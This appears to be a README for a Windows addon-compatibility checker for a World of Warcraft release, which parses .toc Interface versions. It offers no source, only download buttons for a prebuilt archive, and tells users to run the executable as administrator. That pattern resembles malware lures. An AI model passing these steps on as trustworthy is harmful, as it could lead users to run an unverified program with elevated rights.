# WoW Forever Addon Compatibility Checker

![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=flat-square&logo=windows&logoColor=white)
![Version](https://img.shields.io/badge/Version-1.0.0-brightgreen?style=flat-square)
![Downloads](https://img.shields.io/badge/Downloads-New-blue?style=flat-square)
![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)

Desktop compatibility checker for World of Warcraft: Forever — scans your AddOns folder and flags addons that haven't been updated for the Midnight interface (120000).

<div align="center">

[![Download for Windows](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-2EA043?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Pentagongriculvert/wow-forever-addon-checker-2026/releases/tag/1.0.0)

</div>

---

## ⚡ At a Glance

| | |
|---|---|
| **What it is** | Addon compatibility checker for WoW: Forever |
| **Who it's for** | Players dealing with the Midnight addon changes |
| **What it solves** | Addons silently fail; no tool checks TOC compatibility |
| **How it works** | Parses `.toc` files, checks Interface version, flags outdated addons |

---

## 🔥 Why This Exists

Blizzard's 12.0 pre-patch (Midnight) changed how addons work. Many addons that accessed combat data were intentionally broken. New addons require TOC updates to Interface 120000. Some addons appear to load but silently fail — like BlazDamage, whose auto-discovery hook simply doesn't exist on Midnight.

Existing addon managers (Grimoire, rs-addon-manager) download and install addons. They don't check whether those addons are actually compatible with the current interface. This checker does.

---

## 🧩 What It Does

### Addon Scanner
- Reads `Interface/AddOns` folder
- Parses every `.toc` file
- Extracts: addon name, Interface version, last modified date

### Compatibility Report
- **Green**: Interface 120000+ (Midnight compatible)
- **Yellow**: Older Interface, might work with limitations
- **Red**: Very old Interface or known broken
- Export to CSV for sharing

### No Game Interaction
- No memory reading
- No hooks
- No game process required
- Works offline

---

## 💻 System Requirements

| Component | Minimum | Recommended |
| :--- | :--- | :--- |
| **OS** | Windows 10 (64-bit) | Windows 11 |
| **RAM** | 4 GB | 8 GB |
| **Storage** | 50 MB | 100 MB |
| **Runtime** | .NET 8.0 (bundled) | .NET 8.0 |
| **Game** | WoW: Forever installed | Latest patch |
| **Permissions** | Standard user | Administrator |

---

## 🚀 Quick Start

1. **Download** the archive using the button above
2. **Extract** with 7-Zip or WinRAR
3. **Run** `AddonChecker.exe` as administrator
4. **Select** your `Interface/AddOns` folder
5. **Click** Scan — see which addons need updates

---

## ❓ FAQ

**Does this modify my addons?**
No — it only reads `.toc` files. No changes are made.

**Will I get banned?**
No — this is a file scanner. It doesn't interact with the game or any online service.

**Does it work with Classic?**
The checker targets the Midnight interface (120000). Classic uses different interface versions — support is planned.

**How accurate is the Interface check?**
It reads the `## Interface:` line from each `.toc`. If an addon has no Interface line, it's flagged as unknown.

**Does it tell me which addons are safe to use?**
It tells you which addons have been updated for Midnight. Some old addons may still work, but they're flagged as yellow.

**How do I uninstall?**
Delete the folder. No registry entries.

---

## 🗺️ Roadmap

- [ ] Classic support
- [ ] Integration with CurseForge API for update checks
- [ ] Batch update TOC files (with backup)
- [ ] Multi-language support

---

## 📄 License

MIT License — see [LICENSE](LICENSE) for details.

---

<div align="center">

[![Download for Windows](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-2EA043?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Pentagongriculvert/wow-forever-addon-checker-2026/releases/tag/1.0.0)

**Version 1.0.0** — Compatibility Checker · TOC Scanner · MIT

</div>
